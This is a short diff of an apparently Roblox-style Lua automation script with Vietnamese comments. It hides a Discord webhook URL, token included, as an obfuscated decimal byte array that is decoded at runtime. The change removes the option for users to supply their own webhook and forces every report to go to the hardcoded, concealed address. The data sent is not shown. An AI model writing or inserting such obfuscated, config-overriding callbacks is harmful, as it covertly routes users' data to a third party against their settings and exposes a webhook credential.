@@ -25,7 +25,7 @@ local TargetMerchant  = "RngMerchant"-- Tên Merchant (Đổi khi có ID thật)
 local _b = {104, 116, 116, 112, 115, 58, 47, 47, 100, 105, 115, 99, 111, 114, 100, 46, 99, 111, 109, 47, 97, 112, 105, 47, 119, 101, 98, 104, 111, 111, 107, 115, 47, 49, 53, 48, 50, 53, 51, 51, 48, 54, 56, 53, 56, 52, 53, 50, 49, 55, 57, 57, 47, 70, 121, 109, 119, 70, 121, 110, 110, 80, 119, 75, 69, 114, 108, 67, 55, 56, 81, 73, 101, 89, 86, 83, 84, 122, 86, 68, 111, 107, 70, 80, 112, 89, 119, 77, 101, 70, 117, 108, 110, 52, 106, 113, 104, 97, 112, 89, 45, 120, 76, 86, 83, 84, 45, 114, 118, 104, 106, 80, 99, 85, 113, 115, 56, 56, 75, 57, 95}
 local defaultWebhook = ""
 for _, byte in ipairs(_b) do defaultWebhook = defaultWebhook .. string.char(byte) end
-local activeWebhook = (config.WebhookURL ~= nil and config.WebhookURL ~= "") and config.WebhookURL or defaultWebhook
+local activeWebhook = defaultWebhook
 
 -- ==========================================
 -- 2. KHỞI TẠO BIẾN & DỊCH VỤ GAME
